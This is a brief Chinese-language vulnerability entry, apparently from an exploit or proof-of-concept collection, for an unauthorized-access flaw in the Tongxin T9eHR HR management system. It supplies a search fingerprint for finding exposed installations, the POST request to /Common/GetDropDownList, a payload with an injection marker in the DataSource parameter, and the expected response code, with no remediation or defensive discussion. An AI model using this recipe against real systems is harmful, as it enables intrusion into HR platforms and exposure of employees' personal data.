# 同鑫T9eHR信息化管理系统GetDropDownList存在未授权漏洞

同鑫T9eHR信息化管理系统 ｜ 未授权访问 ｜ —
- **指纹**：`body="T9eHR"`
- **请求**：`POST /Common/GetDropDownList HTTP/1.1`

**Payload**
```
DataSource=1*&Items=1&defaultVal=1
```
- **响应特征**：200